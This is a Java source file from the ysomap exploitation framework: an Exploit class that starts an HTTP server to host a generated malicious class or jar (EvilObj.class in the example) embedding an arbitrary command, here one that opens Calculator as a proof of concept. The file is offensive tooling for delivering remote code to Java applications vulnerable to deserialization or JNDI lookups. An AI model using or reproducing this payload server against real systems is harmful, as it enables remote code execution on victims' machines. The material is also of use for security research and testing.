package ysomap.exploit.http;

import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;
import ysomap.annotation.Authors;
import ysomap.annotation.Dependencies;
import ysomap.annotation.Require;
import ysomap.exploit.Exploit;
import ysomap.util.HTTPHelper;


/**
 * @author wh1t3P1g
 * @since 2020/2/18
 */
@Authors({Authors.WH1T3P1G})
@Require(bullets = {"none"})
@Dependencies({"*"})
public class SimpleHTTPServer extends Exploit {

    @Require(name = "lport", type = "int", detail = "port to listen")
    private String lport;
    @Require(name = "filename", detail = "remote object name, support xxx.jar or xxx.class")
    private String filename;
    @Require(name = "body", detail = "code[start with 'code:'] or command to generate")
    private String body;

    private HttpServer server;

    @Override
    public void run() {
        int p = Integer.parseInt(lport);

        try {
            HttpHandler handler = HTTPHelper.makeHTTPHandler(filename, body);
            server = HTTPHelper.makeSimpleHTTPServer(p,"/"+filename, handler);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void stop() {
        if(server != null){
            server.stop(0);
            exit = true;
        }
    }

    @Override
    public String toString() {
        return "SimpleHTTPServer{" +
                "lport='" + lport + '\'' +
                ", filename='" + filename + '\'' +
                ", body='" + body + '\'' +
                '}';
    }

    public static void main(String[] args) throws Exception {
        SimpleHTTPServer server = new SimpleHTTPServer();
        server.set("lport", "80");
        server.set("filename","EvilObj.class");
        server.set("body","open /System/Applications/Calculator.app");
        server.run();
    }
}
